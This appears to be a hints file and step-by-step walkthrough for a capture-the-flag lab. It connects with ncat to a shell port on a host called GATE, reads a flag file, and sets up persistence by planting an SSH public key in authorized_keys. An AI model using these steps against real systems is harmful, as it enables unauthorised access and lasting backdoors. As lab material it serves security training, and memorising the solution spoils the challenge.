hints.text: Look for the flag in the ctf user's home directory. Also, read PERSISTENCE.txt to learn about SSH key authentication.

The flag is at /home/ctf/flag-01.txt. To establish persistence, generate an SSH key on LAUNCHPAD (ssh-keygen -t ed25519 -f ~/.ssh/pivot_key -N ""), then add your public key to ~/.ssh/authorized_keys on GATE.

1. From LAUNCHPAD: ncat <gate_ip> 9999
2. You get a shell as ctf
3. cat /home/ctf/flag-01.txt
4. On LAUNCHPAD: ssh-keygen -t ed25519 -f ~/.ssh/pivot_key -N ""
5. Copy the public key content from ~/.ssh/pivot_key.pub
6. On GATE: mkdir -p ~/.ssh && echo '<your_pubkey>' >> ~/.ssh/authorized_keys
7. chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
8. Test: ssh -i ~/.ssh/pivot_key ctf@<gate_ip>
